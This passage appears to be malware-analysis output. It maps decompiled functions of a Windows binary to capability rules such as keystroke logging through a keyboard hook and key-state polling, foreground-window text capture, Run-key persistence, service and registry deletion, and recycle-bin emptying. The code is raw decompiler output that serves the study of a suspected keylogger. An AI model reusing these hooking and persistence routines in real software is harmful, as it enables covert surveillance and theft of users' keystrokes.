fcn.00405a48();\n                puStack76 = 0x48a038;\n                fcn.00405964();\n                puStack76 = 0x48a045;\n                fcn.00405a48();\n                puStack76 = 0x48a054;\n                fcn.004059a4();\n                puStack76 = 0x48a05f;\n                fcn.00405504();\n                uStack80 = 0x48a085;\n                iStack84 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffac;\n                puStack76 = &stack0xfffffffc;\n                iVar1 = fcn.00409dd8();\n                sub.wsock32.dll_closesocket();\n                *in_FS_OFFSET = iVar1;\n                var_20h = var_20h + -1;\n            } while (var_20h != 0);\n        }\n        uStack80 = 0x48a0a5;\n        (**(**0x4ad450 + 0x44))();\n        *in_FS_OFFSET = puStack76;\n        puStack68 = 0x48a0c4;\n        puStack72 = 0x4ad454;\n        puStack76 = 0x48a0bc;\n        sub.kernel32.dll_LeaveCriticalSection();\n        return;\n    }\n    uStack80 = 0x489f2d;\n    fcn.00404f60();\n    *in_FS_OFFSET = puStack76;\n    puStack68 = 0x48a0e6;\n    puStack72 = 0x48a0de;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 1112
    },
    "0048dc84": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid fcn.0048dc84(void)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_1ch = &stack0xfffffffc;\n    var_ch = 5;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_20h = 0x48de18;\n    var_24h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0048dc84::var_24h;\n    var_18h = unaff_EDI;\n    var_14h = unaff_ESI;\n    fcn.0040546c();\n    piVar1 = fcn.00420b38();\n    piVar2 = fcn.00404610();\n    fcn.00420c14();\n    fcn.00420d58();\n    fcn.0042124c();\n    iVar3 = (**(*piVar2 + 0x14))();\n    if (-1 < iVar3 + -1) {\n        var_20h = 0;\n        var_24h = iVar3;\n        do {\n            (**(*piVar2 + 0xc))();\n            fcn.00405784();\n            fcn.00420d58();\n            fcn.004214dc();\n            fcn.004214dc();\n            fcn.004214dc();\n            fcn.004214dc();\n            fcn.004214dc();\n            (**(*piVar2 + 0xc))(*var_1ch);\n            var_4h = 0x48df20;\n            var_8h = var_ch;\n            var_ch = 0x48df20;\n            var_14h = 0x48df20;\n            var_18h = 0x48df20;\n            var_1ch = 0x48df20;\n            var_20h = 0x48df20;\n            var_24h = 0x48df2c;\n            fcn.00405800();\n            var_20h = var_20h + 1;\n            var_24h = var_24h + -1;\n        } while (var_24h != 0);\n    }\n    fcn.00404640();\n    fcn.00420be4();\n    (**(*piVar1 + -4))();\n    *in_FS_OFFSET = var_24h;\n    var_1ch = 0x48de1f;\n    var_20h = 0x48de0a;\n    fcn.00405490();\n    var_20h = 0x48de17;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 770
    },
    "0040a0c0": {
        "rules": [
            "read file on Windows"
        ],
        "decompiled_code": "\nulong fcn.0040a0c0(void)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    uint uStack36;\n    \n    iVar1 = sub.kernel32.dll_ReadFile_1();\n    uStack36 = in_EAX;\n    if (iVar1 == 0) {\n        uStack36 = 0xffffffff;\n    }\n    return CONCAT44(uStack36, uStack36);\n}\n",
        "token_count": 90
    },
    "0040a0ec": {
        "rules": [
            "write file on Windows"
        ],
        "decompiled_code": "\nulong fcn.0040a0ec(void)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    uint uStack36;\n    \n    iVar1 = sub.kernel32.dll_WriteFile_1();\n    uStack36 = in_EAX;\n    if (iVar1 == 0) {\n        uStack36 = 0xffffffff;\n    }\n    return CONCAT44(uStack36, uStack36);\n}\n",
        "token_count": 89
    },
    "004213dc": {
        "rules": [
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004213dc(uchar *param_1)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t unaff_EBX;\n    uint uVar4;\n    uchar *puStack20;\n    \n    puStack20 = param_1;\n    fcn.00403ae4();\n    uVar2 = fcn.004058fc(0, &puStack20, 0, param_1 + 4);\n    uVar4 = *(in_EAX + 4);\n    iVar3 = sub.advapi32.dll_RegQueryValueExA_1(uVar4, uVar2);\n    uVar1 = fcn.00420b10();\n    *param_1 = uVar1;\n    return CONCAT44(uVar4, unaff_EBX & 0xffffff00 | iVar3 == 0);\n}\n",
        "token_count": 200
    },
    "00423454": {
        "rules": [
            "link function at runtime on Windows",
            "link many functions at runtime"
        ],
        "decompiled_code": "\nvoid fcn.00423454(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_GetModuleHandleA_2(0x4234c8);\n    if (iVar1 != 0) {\n        *0x4a1b64 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x4234d4);\n        *0x4a1b68 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x4234e8);\n        *0x4a1b6c = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x4234f8);\n        *0x4a1b70 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x423510);\n        *0x4a1b74 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x423528);\n        *0x4a1b78 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x423540);\n    }\n    return;\n}\n",
        "token_count": 232
    },
    "00451b1c": {
        "rules": [
            "link function at runtime on Windows",
            "link many functions at runtime"
        ],
        "decompiled_code": "\nvoid fcn.00451b1c(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_GetModuleHandleA_2(0x451c80);\n    if (iVar1 != 0) {\n        *0x4aafc0 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x451c90);\n        *0x4aafc4 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x451ca4);\n        *0x4aafb8 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x451cb8);\n        *0x4aafbc = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x451cd0);\n        *0x4aaf94 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x451ce8);\n        if (*0x4aaf94 == 0) {\n            *0x4aaf94 = 0x407f80;\n        }\n        *0x4aaf98 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x451d00);\n        if (*0x4aaf98 == 0) {\n            *0x4aaf98 = 0x4083e8;\n        }\n        *0x4aaf9c = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x451d18);\n        if (*0x4aaf9c == 0) {\n            *0x4aaf9c = 0x408110;\n        }\n        *0x4aafa0 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x451d30);\n        if (*0x4aafa0 == 0) {\n            *0x4aafa0 = 0x408100;\n        }\n        *0x4aafa4 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x451d48);\n        if (*0x4aafa4 == 0) {\n            *0x4aafa4 = 0x408108;\n        }\n        *0x4aafa8 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x451d5c);\n        if (*0x4aafa8 == 0) {\n            *0x4aafa8 = 0x408398;\n        }\n        *0x4aafac = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x451d70);\n        if (*0x4aafac == 0) {\n            *0x4aafac = 0x408390;\n        }\n        *0x4aafb0 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x451d88);\n        if (*0x4aafb0 == 0) {\n            *0x4aafb0 = 0x4083a0;\n        }\n    }\n    return;\n}\n",
        "token_count": 651
    },
    "0047d92c": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nvoid fcn.0047d92c(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_GetModuleHandleA_2(0x47d950);\n    if (iVar1 != 0) {\n        *0x4a48ec = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x47d95c);\n    }\n    return;\n}\n",
        "token_count": 87
    },
    "0040d27c": {
        "rules": [
            "get geographical location"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040d27c(uint32_t param_1)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_GetLocaleInfoA_1();\n    if (0 < iVar1) {\n        param_1 = in_EAX & 0xff;\n    }\n    return CONCAT44(in_EAX, param_1);\n}\n",
        "token_count": 88
    },
    "004075b8": {
        "rules": [
            "get thread local storage value"
        ],
        "decompiled_code": "\nint32_t fcn.004075b8(void)\n\n{\n    int32_t iVar1;\n    int32_t in_FS_OFFSET;\n    \n    if (*0x4a87f4 == '\\0') {\n        return *(*(in_FS_OFFSET + 0x2c) + *0x4a17b0 * 4);\n    }\n    iVar1 = sub.kernel32.dll_TlsGetValue(*0x4a17b0);\n    if (iVar1 != 0) {\n        return iVar1;\n    }\n    fcn.00407574();\n    iVar1 = sub.kernel32.dll_TlsGetValue(*0x4a17b0);\n    if (iVar1 != 0) {\n        return iVar1;\n    }\n    return *0x4a87fc;\n}\n",
        "token_count": 167
    },
    "0041bfdc": {
        "rules": [
            "extract resource via kernel32 functions"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041bfdc(uint noname_0, uint lpType)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint lpName;\n    \n    iVar1 = sub.kernel32.dll_FindResourceA();\n    *(in_EAX + 0x10) = iVar1;\n    if (iVar1 == 0) {\n        fcn.0041bf3c(&stack0xfffffffc);\n    }\n    iVar1 = sub.kernel32.dll_LoadResource();\n    *(in_EAX + 0x14) = iVar1;\n    if (iVar1 == 0) {\n        fcn.0041bf3c(&stack0xfffffffc);\n    }\n    uVar2 = sub.kernel32.dll_SizeofResource();\n    sub.kernel32.dll_LockResource(*(in_EAX + 0x14), uVar2);\n    fcn.0041bb2c();\n    return;\n}\n",
        "token_count": 205
    },
    "004211c4": {
        "rules": [
            "delete registry value"
        ],
        "decompiled_code": "\nuint32_t fcn.004211c4(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = fcn.004058fc();\n    uVar2 = sub.advapi32.dll_RegDeleteValueA(*(in_EAX + 4), uVar1);\n    return uVar2 & 0xffffff00 | uVar2 == 0;\n}\n",
        "token_count": 94
    },
    "004221f0": {
        "rules": [
            "get service handle",
            "delete service"
        ],
        "decompiled_code": "\nvoid fcn.004221f0(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStackY68;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x422202;\n    fcn.004058ec();\n    uStack28 = 0x42226f;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    iVar1 = sub.advapi32.dll_OpenSCManagerA(0, 0, 0xf003f);\n    if (iVar1 != 0) {\n        uVar2 = fcn.004058fc(0x10000);\n        iVar3 = sub.advapi32.dll_OpenServiceA(iVar1, uVar2);\n        if (iVar3 != 0) {\n            sub.advapi32.dll_DeleteService(iVar3);\n            sub.advapi32.dll_CloseServiceHandle(iVar3);\n        }\n        sub.advapi32.dll_CloseServiceHandle();\n        iStackY68 = iVar1;\n    }\n    *in_FS_OFFSET = iStackY68;\n    fcn.0040546c(0x422276);\n    return;\n}\n",
        "token_count": 303
    },
    "00471828": {
        "rules": [
            "log keystrokes via polling"
        ],
        "decompiled_code": "\nuint8_t fcn.00471828(void)\n\n{\n    int16_t iVar1;\n    uint32_t in_EAX;\n    uint8_t uVar2;\n    \n    uVar2 = *0x471864;\n    iVar1 = sub.user32.dll_GetKeyState(0x10);\n    if (iVar1 < 0) {\n        uVar2 = uVar2 | 1;\n    }\n    iVar1 = sub.user32.dll_GetKeyState(0x11);\n    if (iVar1 < 0) {\n        uVar2 = uVar2 | 4;\n    }\n    if ((in_EAX & 0x20000000) != 0) {\n        uVar2 = uVar2 | 2;\n    }\n    return uVar2;\n}\n",
        "token_count": 168
    },
    "0048ca28": {
        "rules": [
            "get common file path"
        ],
        "decompiled_code": "\nvoid fcn.0048ca28(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00402ef0();\n    sub.kernel32.dll_GetSystemDirectoryA(uVar1, 0x90);\n    fcn.0048c17c();\n    fcn.00402f0c();\n    return;\n}\n",
        "token_count": 74
    },
    "0048ca58": {
        "rules": [
            "get common file path"
        ],
        "decompiled_code": "\nvoid fcn.0048ca58(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00402ef0();\n    sub.kernel32.dll_GetWindowsDirectoryA(uVar1, 0x90);\n    fcn.0048c17c();\n    fcn.00402f0c();\n    return;\n}\n",
        "token_count": 74
    },
    "00488978": {
        "rules": [
            "log keystrokes"
        ],
        "decompiled_code": "\nuint fcn.00488978(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.user32.dll_MapVirtualKeyA();\n    if (iVar1 == 0x1a) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 58
    },
    "00483d44": {
        "rules": [
            "enumerate gui resources"
        ],
        "decompiled_code": "\nvoid fcn.00483d44(void)\n\n{\n    fcn.0040546c();\n    sub.user32.dll_EnumWindows(fcn.00483b30, 0);\n    fcn.004054c0();\n    return;\n}\n",
        "token_count": 53
    },
    "00483f70": {
        "rules": [
            "enumerate gui resources"
        ],
        "decompiled_code": "\nvoid fcn.00483f70(void)\n\n{\n    fcn.0040546c();\n    sub.user32.dll_EnumWindows(fcn.00483d6c, 0);\n    fcn.004054c0();\n    return;\n}\n",
        "token_count": 54
    },
    "00484094": {
        "rules": [
            "enumerate gui resources"
        ],
        "decompiled_code": "\nvoid fcn.00484094(void)\n\n{\n    fcn.0040546c();\n    sub.user32.dll_EnumWindows(fcn.00483f98, 0);\n    fcn.004054c0();\n    return;\n}\n",
        "token_count": 52
    },
    "00488f80": {
        "rules": [
            "set application hook",
            "log keystrokes via application hook"
        ],
        "decompiled_code": "\nvoid fcn.00488f80(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x489088;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0, 0);\n    *0x4ad280 = sub.user32.dll_SetWindowsHookExA(0xd, fcn.00488990, uVar2);\n    fcn.00488118();\n    fcn.00405738();\n    cVar1 = fcn.0040a18c();\n    if (cVar1 == '\\0') {\n        fcn.00488118();\n        fcn.00405738();\n        fcn.0040a1b0();\n    }\n    fcn.00488118();\n    fcn.00487d38(0x4890a0, 0);\n    fcn.00405800();\n    fcn.00403760();\n    fcn.00487fd8();\n    fcn.004054c0();\n    fcn.00487fd8();\n    fcn.004054c0();\n    fcn.00488158();\n    fcn.004054c0();\n    *in_FS_OFFSET = 0;\n    fcn.00405490(0x48908f);\n    return;\n}\n",
        "token_count": 394
    },
    "00487fd8": {
        "rules": [
            "get graphical window text"
        ],
        "decompiled_code": "\nvoid fcn.00487fd8(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffd0;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x488045;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack32;\n    fcn.0040546c();\n    iVar1 = sub.user32.dll_GetForegroundWindow();\n    if (iVar1 != 0) {\n        iVar2 = sub.user32.dll_GetWindowTextLengthA(iVar1);\n        fcn.00405b8c();\n        uVar3 = fcn.004058fc(iVar2 + 1);\n        sub.user32.dll_GetWindowTextA(iVar1, uVar3);\n        fcn.0048c238();\n        in_stack_ffffffd0 = iVar1;\n    }\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    fcn.0040546c(0x48804c);\n    return;\n}\n",
        "token_count": 269
    },
    "0048c270": {
        "rules": [
            "get graphical window text"
        ],
        "decompiled_code": "\nvoid fcn.0048c270(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffd0;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x48c2dd;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack32;\n    fcn.0040546c();\n    iVar1 = sub.user32.dll_GetForegroundWindow();\n    if (iVar1 != 0) {\n        iVar2 = sub.user32.dll_GetWindowTextLengthA(iVar1);\n        fcn.00405b8c();\n        uVar3 = fcn.004058fc(iVar2 + 1);\n        sub.user32.dll_GetWindowTextA(iVar1, uVar3);\n        fcn.0048c238();\n        in_stack_ffffffd0 = iVar1;\n    }\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    fcn.0040546c(0x48c2e4);\n    return;\n}\n",
        "token_count": 273
    },
    "0049daa4": {
        "rules": [
            "get graphical window text"
        ],
        "decompiled_code": "\nvoid fcn.0049daa4(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffd0;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x49db11;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack32;\n    fcn.0040546c();\n    iVar1 = sub.user32.dll_GetForegroundWindow();\n    if (iVar1 != 0) {\n        iVar2 = sub.user32.dll_GetWindowTextLengthA(iVar1);\n        fcn.00405b8c();\n        uVar3 = fcn.004058fc(iVar2 + 1);\n        sub.user32.dll_GetWindowTextA(iVar1, uVar3);\n        fcn.00409b1c();\n        in_stack_ffffffd0 = iVar1;\n    }\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    fcn.0040546c(0x49db18);\n    return;\n}\n",
        "token_count": 272
    },
    "00481924": {
        "rules": [
            "persist via Run registry key"
        ],
        "decompiled_code": "\nvoid fcn.00481924(void)\n\n{\n    fcn.00420b38();\n    fcn.00420c14();\n    fcn.00420d58();\n    fcn.004214dc();\n    return;\n}\n",
        "token_count": 50
    },
    "0048dc70": {
        "rules": [
            "empty the recycle bin"
        ],
        "decompiled_code": "\nvoid fcn.0048dc70(void)\n\n{\n    sub.SHELL32.DLL_SHEmptyRecycleBinA(0, 0x48dc80, 1);\n    return;\n}\n",
        "token_count": 44
    }
}